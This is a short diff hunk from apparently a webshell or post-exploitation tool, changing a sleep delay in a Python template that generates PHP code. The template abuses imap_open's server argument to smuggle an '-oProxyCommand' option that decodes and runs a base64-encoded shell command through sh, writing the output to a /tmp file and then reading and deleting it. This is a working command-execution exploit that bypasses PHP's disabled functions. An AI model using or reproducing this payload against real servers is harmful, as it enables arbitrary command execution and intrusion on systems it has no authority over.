@@ -925,7 +925,7 @@ $o = $stdout->ReadAll();
         return """if (!function_exists('imap_open')) {print("no imap_open function!");}
 else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
 imap_open('{' . $server . ':143/imap}INBOX', '', '');
-sleep(0.5);
+sleep(1);
 $o=file_get_contents("/tmp/%s");
 %s
 unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
